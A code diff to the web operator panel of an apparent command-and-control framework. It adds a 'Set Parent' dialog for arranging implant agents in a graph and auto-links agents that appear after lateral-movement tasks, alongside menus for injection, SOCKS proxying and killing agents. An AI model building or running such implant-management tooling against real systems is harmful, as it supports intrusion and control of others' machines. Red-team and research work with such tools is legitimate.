@@ -2389,6 +2389,28 @@ async function runCtxAction(act) {
   switch (act.fn) {
     case 'openConsoleFor':   openConsoleFor(act.id); break;
     case 'deleteAgent':      deleteAgent(act.id); break;
+    case 'setParent': {
+      const childID = act.id;
+      const opts = agents
+        .filter(a => a.id !== childID)
+        .map(a => `<option value="${a.id}">${a.id.substring(0,8)} — ${esc(a.hostname||'')} (${esc(a.ip||'')})</option>`)
+        .join('');
+      const cur = agents.find(a=>a.id===childID)?.parent_id || '';
+      showModal(`<h3 style="margin:0 0 12px">Set Parent Agent</h3>
+        <p style="color:var(--text2);font-size:12px;margin:0 0 10px">Agente: <b>${childID.substring(0,8)}</b></p>
+        <select id="_spar_sel" style="width:100%;padding:6px;background:var(--bg3);border:1px solid var(--border);color:var(--text);border-radius:4px;margin-bottom:8px">
+          <option value="">— C2 Server (root) —</option>${opts}
+        </select>`,
+        [{label:'Save', fn: async () => {
+          const pid = document.getElementById('_spar_sel')?.value || '';
+          const r = await api('POST', `/api/agents/${childID}/parent`, {parent_id: pid});
+          if (r.ok) { toast('Parent updated'); await refreshAgents(); }
+          else toast(r.error||'Error', 'red');
+          closeModal();
+        }}, {label:'Cancel', fn: closeModal}]);
+      if (cur) { const s = document.getElementById('_spar_sel'); if(s) s.value = cur; }
+      break;
+    }
     case 'openProcessList':  openProcessList(act.id); break;
     case 'openFileExplorer': openFileExplorer(act.id); break;
     case 'injectModal':      openInjectModal(act.id, act.mode, act.pid); break;
@@ -2887,6 +2909,7 @@ function agentContextMenu(e, agentId) {
     {label:'🪙  Rev2Self',          action:{fn:'selectAndTask', id, type:'REV2SELF',  args:''}},
     {label:'🧹  Cleanup',           action:{fn:'selectAndTask', id, type:'CLEANUP',   args:''}},
     null,
+    {label:'🌿  Set Parent…',        action:{fn:'setParent',     id}},
     {label:'☠  Kill Agent',         action:{fn:'selectAndTask', id, type:'KILL',      args:''}, danger:true},
     {label:'🗑  Delete Record',     action:{fn:'deleteAgent',   id},                             danger:true},
   ]);
@@ -4882,6 +4905,26 @@ async function refreshAgents() {
     const r = await api('GET', '/api/agents');
     if (!r.ok) return;
     agents = (r.data || []).sort((a,b) => (a.first_seen||a.id) < (b.first_seen||b.id) ? -1 : 1);
+    // Auto-assign parent_id for agents spawned via lateral movement
+    for (const [host, w] of Object.entries(_lateralWatchers)) {
+      if (Date.now() > w.expiry) { delete _lateralWatchers[host]; continue; }
+      for (const a of agents) {
+        const matchIP   = a.ip === host;
+        const matchHost = a.hostname?.toLowerCase() === host.toLowerCase();
+        if ((matchIP || matchHost) && !w.knownIds.has(a.id) && !a.parent_id) {
+          api('POST', `/api/agents/${a.id}/parent`, {parent_id: w.parentID}).then(pr => {
+            if (pr.ok) {
+              a.parent_id = w.parentID;
+              renderAgents();
+              addConsoleOutputForAgent(w.parentID,
+                `[+] lateral child ${a.id.substring(0,8)} (${a.hostname}) → parent set in graph`, '', null);
+            }
+          });
+          delete _lateralWatchers[host];
+          break;
+        }
+      }
+    }
     renderAgents();
     updateAgentSelects();
   } catch(e) {}
@@ -8176,6 +8219,8 @@ async function dispatchConsoleCmd(agentID, cmdLine) {
 let pollTimers = {};
 // Map taskID → {agentID, type, args} for jump auto-retry
 const _jumpTaskMap = {};
+// Map targetHost → {parentID, knownIds, expiry} — auto-assign parent_id when new agent arrives
+const _lateralWatchers = {};
 function pollResultForAgent(agentID, taskID) {
   pollResult(taskID, agentID);
 }
@@ -8248,6 +8293,19 @@ async function pollResult(taskID, agentID) {
           const m = out.match(/:(\d+)/); if (m) agentSocksPort[aid] = parseInt(m[1]);
         } else if (out.includes('SOCKS5 stopped') || out.includes('SOCKS stopped')) {
           delete agentSocksPort[aid];
+        }
+        // After a successful lateral move, watch target host for a new child agent
+        if (orig && !err && out.includes('[+]')) {
+          try {
+            const la = JSON.parse(orig.args);
+            if (la.host) {
+              _lateralWatchers[la.host] = {
+                parentID: aid,
+                knownIds: new Set(agents.map(a => a.id)),
+                expiry:   Date.now() + 180000,
+              };
+            }
+          } catch(_) {}
         }
         if (orig) delete _jumpTaskMap[taskID];
         delete pollTimers[key];
